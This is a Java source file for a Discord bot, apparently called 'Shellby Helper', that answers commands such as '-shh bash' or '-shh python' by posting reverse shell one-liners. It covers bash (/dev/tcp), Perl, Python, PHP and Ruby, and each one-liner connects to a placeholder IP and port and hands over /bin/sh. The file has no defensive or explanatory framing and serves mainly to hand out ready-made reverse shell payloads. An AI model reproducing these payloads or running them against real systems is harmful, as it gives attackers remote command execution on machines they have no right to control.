package com.Daskama.shelby.comands;

import org.javacord.api.entity.message.Message;
import org.javacord.api.entity.message.MessageBuilder;
import org.javacord.api.entity.message.embed.EmbedBuilder;
import org.javacord.api.event.message.MessageCreateEvent;
import org.javacord.api.listener.message.MessageCreateListener;

import java.awt.*;

public class ComanndShellby_reverseshells implements MessageCreateListener {
    public void onMessageCreate(MessageCreateEvent event) {
        Message sprava_shell = event.getMessage();



        //```

        if (sprava_shell.getContent().equalsIgnoreCase("-shh bash")) {
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Bash Reverse Shell**")
                            .setDescription("**Use this code**  \n"
                                    + "```bash -i >& /dev/tcp/IP/8080 0>&1```" )
                            .setTimestampToNow()
                            .setFooter("Shellby Helper")
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).join();

        };


        if (sprava_shell.getContent().equalsIgnoreCase("-shh perl")) {
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Perl Reverse Shell**")
                            .setDescription("Use this code  \n " +
                                    "```perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'```")
                            .setTimestampToNow()
                            .setFooter("Shellby Helper")
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).join();

        };

        if (sprava_shell.getContent().equalsIgnoreCase("-shh python")) {
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Python Reverse Shell**")
                            .setDescription("Use this code \n" +
                                    "```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")
                            .setTimestampToNow()
                            .setFooter("Shellby Helper")
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).join();

        };

        if (sprava_shell.getContent().equalsIgnoreCase("-shh php")) {
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**PHP Reverse Shell**")
                            .setDescription("Use this code \n " +
                                    "```php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&DESCRIPTOR >&DESCRIPTOR 2>&DESCRIPTOR\");'\n```")
                            .setTimestampToNow()
                            .setFooter("Shellby Helper")
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).join();

        };

        if (sprava_shell.getContent().equalsIgnoreCase("-shh ruby")) {
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Ruby Reverse Shell**")
                            .setDescription("Use this code \n" +
                             "```ruby -rsocket -e'f=TCPSocket.open(\"IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n```")
                            .setTimestampToNow()
                            .setFooter("Shellby Helper")
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).join();

        };



    }
}
